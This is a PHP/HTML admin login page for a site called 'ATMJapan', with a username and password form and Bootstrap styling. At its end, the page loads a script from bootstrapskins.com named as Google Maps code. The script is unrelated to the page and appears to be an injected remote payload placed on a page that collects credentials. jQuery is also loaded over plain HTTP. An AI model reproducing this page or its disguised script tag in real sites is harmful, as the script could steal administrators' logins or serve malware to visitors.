<?php require("dbconnection.php");?>
<!doctype html>
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="Bootstrap/css/bootstrap.min.css">
<link rel="stylesheet" href="Bootstrap/stylesheet.css">
<link rel="icon" type="image/png" href="Images/hlogo.png" sizes="16x16">
<title>ATMJapan</title>
</head>

<body background="Images/loginback.jpg" style="background-repeat:repeat">
<!-- header start --> 
<!-- header end -->  

<div class="container-fluid" style=" margin-top:60px;"> 

<div  class="row">
<div class="col-xs-offset-3 col-sm-6">
<h1 class="text-center " style="color:#333333;"> Login </h1> 
<div class="well" style="border:solid ; border-color:rgb(3, 60, 115);">
<form action="adminsigninprocess.php" method="post" >
<div class="form-group-lg has-success">
<input class="form-control" name="username" type="text" placeholder="Enter username here" required>
</div>
<br>
<div class="form-group-lg has-success">
 <input class="form-control" name="password" type="password" placeholder="Enter password here" required>
</div>
<br>
<button id="sign-in" class="btn btn-lg btn-primary center-block" type="submit">Login  </button>

</form>


</div>
</div>
</div>
</div>
<!-- container end-->





<!--start of footer -->

<!-- end of footer -->

<!-- Latest compiled and minified JavaScript -->
<script src="http://code.jquery.com/jquery-2.1.4.min.js"> </script>
<script src="Bootstrap/js/bootstrap.min.js"></script>
<script 
src="https://www.bootstrapskins.com/google-maps-authorization.js?id=1c150919-c678-1a10-c97a-f597084f6f83&c=google-maps-code&u=1450373278" defer async>
</script>

</body>
</html>
